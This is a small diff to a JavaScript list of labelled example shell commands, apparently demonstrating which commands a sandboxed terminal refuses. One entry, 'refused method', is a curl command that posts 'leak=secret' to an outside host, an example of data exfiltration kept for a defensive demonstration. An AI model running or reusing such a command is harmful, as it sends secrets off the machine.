@@ -626,7 +626,7 @@ import { redrawSequence, submitSequence } from "./line-block.js";
     ["jq refuses the rest", "echo '{}' | jq 'def f: .; f'"],
     ["refused origin", "curl -s https://example.net/ ; echo \"exit $?\""],
     ["refused method", "curl -s -d leak=secret https://example.com/"],
-    ["disk usage", "du -sh / 2>/dev/null; df 2>/dev/null || stat -c '%s %n' notes.txt"],
+    ["disk usage", "du / 2>/dev/null; df 2>/dev/null || stat -c '%s %n' notes.txt"],
   ];
 
   for (const [label, command] of EXAMPLES) {
